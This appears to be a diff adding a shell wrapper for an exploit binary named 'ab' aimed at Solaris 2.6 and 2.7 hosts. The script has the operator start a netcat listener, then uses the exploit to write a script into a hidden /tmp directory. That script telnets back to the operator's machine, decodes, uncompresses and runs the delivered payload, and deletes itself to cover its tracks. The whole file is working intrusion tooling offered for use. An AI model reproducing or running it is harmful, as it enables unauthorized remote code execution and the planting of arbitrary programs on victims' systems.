@@ -1,0 +1,87 @@
+#!/bin/sh
+#
+# Use ab to upload a program via reverse telnet and run it
+#
+
+# Some default values
+SCRIPT="/tmp/.as1267/.s"
+DIR="/tmp/.as1267"
+version="1"
+
+
+# Show usage and exit
+usage() {
+    echo ""
+    echo "Before running this script, you first need to run the following:"
+    echo "      nc -l -p localPort < file2Xfer&Run.uu"
+    echo "where file2Xfer&Run.uu is a compressed, uuencoded file."
+    echo ""
+    echo "telnet <target> 8888"
+    echo "GET / HTTP/1.0[RET][RET]"
+    echo "Tells you the ad is there and its version (=> os_version)"
+    echo ""
+    echo "Usage: ${0} [options] -- [options to <file2Xfer&Run>]"
+    echo "  -i <remoteIP>       (required)"
+    echo "  -v <remoteOS> <1> Sol 2.7  <2> Sol 2.6   def=1"
+    echo "  -l <localIP>        (required)"
+    echo "  -n <localPort>      (no default)"
+    echo "  -f <file2Xfer&Run>  (required)"
+    echo "  -D <remoteDir>      def= $DIR"
+    echo "  -S <remoteScript>   def= $SCRIPT"
+    exit 1
+}
+
+# There must be at least one argument
+if [ ${#} -eq 0 ]; then
+    usage
+fi
+
+#
+# Process args
+#
+# New style options
+    while getopts i:v:l:n:f:D:S: op; do
+	case $op in
+	i)  REMOTE_IP="$OPTARG";;
+	v)  version="$OPTARG";;
+	l)  LOCAL_IP="$OPTARG";;
+	n)  LOCAL_PORT="$OPTARG";;
+	f)  RUN_FILE="$OPTARG";;
+	D)  DIR="$OPTARG";;
+	S)  SCRIPT="$OPTARG";;
+	esac
+    done
+    shift `expr $OPTIND - 1`
+
+    # Check for required args
+    [ -z "$REMOTE_IP" ] && echo "Error: missing remote IP" && usage
+    [ -z "$LOCAL_IP" ] && echo "Error: missing local IP" && usage
+    [ -z "$LOCAL_PORT" ] && echo "Error: missing local PORT" && usage
+    [ -z "$RUN_FILE" ] && echo "Error: missing File to run" && usage
+if [ ${version} != "1" -a ${version} != "2" ]; then
+  echo "Error: Wrong remote os version" && usage
+fi 
+EXTRA="${*}"
+
+
+echo "running: ab ${version} ${REMOTE_IP} ..."
+echo "--> my IP is $LOCAL_IP"
+echo "--> port to telnet to is $LOCAL_PORT"
+echo "--> xfering and running $RUN_FILE"
+echo "--> using tmp file $SCRIPT"
+echo "--> using tmp dir $DIR"
+echo " "
+
+#exit 0
+
+./ab ${version} ${REMOTE_IP} \
+ "/bin/echo \"/bin/mkdir ${DIR}
+cd ${DIR}
+/bin/telnet ${LOCAL_IP} ${LOCAL_PORT} | /usr/bin/uudecode
+/usr/bin/uncompress -f ${RUN_FILE}.Z
+/bin/chmod 0700 ${DIR}/${RUN_FILE}
+PATH=${DIR} ${RUN_FILE} ${EXTRA}
+/bin/rm ${SCRIPT}
+\" > ${SCRIPT} &&
+/bin/sh ${SCRIPT}"
+
